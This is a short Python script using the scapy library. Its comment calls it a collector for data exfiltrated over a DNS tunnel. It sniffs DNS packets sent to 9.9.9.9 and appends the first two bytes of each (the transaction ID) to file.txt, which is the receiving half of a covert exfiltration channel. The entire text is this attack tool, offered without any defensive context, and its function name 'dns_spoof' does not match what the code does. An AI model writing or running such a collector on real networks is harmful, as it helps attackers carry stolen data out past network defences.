# file.txt saves exfiltrate data via DNS tunnel
from scapy.all import *
fo=open('file.txt','ab')
hexstr=''
def dns_spoof (pkt):
  if pkt.dport == 53 and pkt[IP].dst=='9.9.9.9':
    hexdata = raw(pkt[DNS])
    print hexdata
    fo.write (hexdata[:2])
    print hexdata[:2]

sniff(filter='udp port 53', store=0, prn=dns_spoof)
